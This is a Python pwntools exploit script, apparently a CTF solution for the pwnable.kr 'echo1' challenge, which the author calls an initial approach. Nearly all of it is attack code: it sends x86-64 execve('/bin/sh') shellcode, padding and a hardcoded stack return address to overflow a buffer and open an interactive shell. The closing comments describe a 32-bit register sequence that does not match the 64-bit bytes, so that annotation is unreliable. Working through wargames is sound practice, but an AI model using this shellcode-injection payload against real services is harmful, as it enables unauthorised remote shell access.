from pwn import *

# this was my initial approach where i tried putting the shellcode in the buffer before the overwrite.
def main():
    target = sys.argv[1]

    if(target=="remote"):
        print("remote")
        p = remote('pwnable.kr', 9010)
    elif(target=="debug"):
        print("debug")
        p = gdb.debug('./echo1', gdbscript="b *get_input")
    else:
        print("local")
        p = process("./echo1")




    shellcode=b'\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05'
    name = b'gio'
    echo1 = b'1'
    payload = shellcode + 6*b'A' + p64(0x7fffffffe2b0)
    sys.stdout.buffer.write(payload)

    p.sendline(name)
    p.sendline(echo1)
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()

# shell code:

# ; Clear EAX (set to 0)

# ; Push null terminator for "/bin/sh"

# ; Push "//sh"

# ; Push "/bin"

# ; Set EBX to point to "/bin/sh"

# ; Null-terminate argv array

# ; Push pointer to "/bin/sh"

# ; ECX = address of argv

# ; Set EDX to null (envp)

# ; Syscall number for execve

# ; Trigger syscall
